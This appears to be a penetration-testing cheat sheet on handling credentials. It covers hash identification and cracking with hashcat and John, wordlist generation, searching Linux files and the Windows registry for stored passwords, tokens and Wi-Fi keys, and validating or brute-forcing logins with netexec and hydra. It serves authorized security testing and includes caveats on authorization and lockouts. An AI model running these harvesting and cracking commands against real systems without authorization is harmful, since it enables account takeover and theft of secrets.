## Credentials

Treat credentials as relationships between an identity, a secret, a scope, and
a source. A password without its domain or originating service is incomplete.

### Credential ledger

| Domain/host | Username | Secret type | Source | Validated services |
| --- | --- | --- | --- | --- |
| `EXAMPLE` | `jsmith` | Password | Web configuration | SMB, WinRM |

Never overwrite the original hash or ciphertext. Keep transformed cracking input
in a separate file.

### Identify hashes

```bash
hashid hashes.txt
hashcat --example-hashes | less
nth --file hashes.txt
file hashes.txt
awk '{print length($0),$0}' hashes.txt | sort -n
```

Prefer format evidence—prefix, length, source application, and protocol—over a
generic hash identifier.

### Common conversions

```bash
ssh2john id_rsa > id_rsa.hash
keepass2john Database.kdbx > keepass.hash
zip2john archive.zip > zip.hash
pdf2john document.pdf > pdf.hash
pfx2john certificate.pfx > pfx.hash
office2john document.docx > office.hash
bitlocker2john -i disk.img > bitlocker.hash
```

### John and Hashcat

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hashes.txt --show
hashcat -m <mode> hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
hashcat -m <mode> hashes.txt --status --status-timer 10
```

Useful modes:

| Material | Hashcat mode |
| --- | ---: |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| Kerberos AS-REP etype 23 | 18200 |
| Kerberos TGS etype 23 | 13100 |
| KeePass | 13400 |

Confirm the mode against current `hashcat --example-hashes` output.

### Generate targeted candidates

Build candidates from evidence such as organization names, seasons, years,
products, usernames, and passwords already recovered.

```bash
cewl -d 2 -m 5 -w web.words "$URL"
hashcat --stdout base.words -r /usr/share/hashcat/rules/best64.rule > mutated.words
sort -u web.words mutated.words > candidates.txt
crunch 8 10 -t 'Example%%%^^' -o pattern.words
printf '%s\n' Spring Summer Autumn Winter | sed 's/$/2026!/' >> candidates.txt
```

### Search Linux files

```bash
find /home /opt /var/www -type f \( -name '*.conf' -o -name '*.ini' -o -name '*.env' \
  -o -name '*.xml' -o -name '*.yml' -o -name '*.yaml' \) -readable 2>/dev/null

rg -n -i 'password|passwd|secret|token|api[_-]?key|credential' /var/www /opt 2>/dev/null
find /home -type f \( -name 'id_*' -o -name '*.kdbx' -o -name '*.key' \) 2>/dev/null
grep -RInsE 'pass(word)?|secret|token|api[_-]?key' /etc /home /opt /var/www 2>/dev/null
tr '\0' '\n' </proc/<PID>/environ
systemctl show <service> --property=Environment --property=EnvironmentFiles
```

Also inspect shell history, service unit files, scheduled tasks, process command
lines, mounted shares, and application backups.

### Search Windows files and registry

```powershell
Get-ChildItem C:\Users,C:\inetpub,C:\xampp -Recurse -Force -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -match '\.(config|ini|xml|txt|ps1|bat|kdbx)$' }

Get-ChildItem C:\Users -Recurse -File -ErrorAction SilentlyContinue |
  Select-String -Pattern 'password|passwd|secret|token|connectionString'

Get-Content (Get-PSReadLineOption).HistorySavePath
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
findstr /si /m "password secret token connectionString" C:\inetpub\wwwroot\*.config C:\inetpub\wwwroot\*.xml
netsh wlan show profiles
netsh wlan show profile name="<profile>" key=clear
```

Scope broad searches to likely application and user directories first; searching
an entire filesystem produces noise and may be slow.

### Validate deliberately

```bash
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS"
netexec winrm "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS"
ldapwhoami -x -H "ldap://$IP" -D "$USER@$DOMAIN" -w "$PASS"
netexec ssh "$IP" -u "$USER" -p "$PASS"
netexec ftp "$IP" -u "$USER" -p "$PASS"
```

## Narrow online checks

Use online guesses only when the target is authorized, the protocol is known,
and the candidate set is small enough to avoid uncontrolled lockouts.

```bash
hydra -L users.txt -P candidates.txt -f -V ssh://"$IP"
hydra -L users.txt -P candidates.txt -f -V smb://"$IP"
hydra -L users.txt -P candidates.txt "$IP" http-post-form \
  '/login:username=^USER^&password=^PASS^:F=Invalid credentials'
```

Validate the failure marker and request format against a captured login attempt
before starting Hydra.

Avoid uncontrolled spraying. Check the password policy, use a narrow user list,
limit attempts, and record which target and protocol validated each credential.

### Troubleshooting

- Try `DOMAIN/user`, `user@domain`, and local authentication only when appropriate.
- Distinguish an invalid password from a valid account lacking logon rights.
- Check clock skew before concluding Kerberos credentials are invalid.
- A reused password may belong to a different local account with the same name.
- Preserve exact capitalization and special characters when moving secrets
  between shells.
- Remove `$HEX[]` wrappers or application metadata only when the cracking tool's
  input format requires it.
- Use `--username` in Hashcat only for files that actually prefix each hash with
  a username.
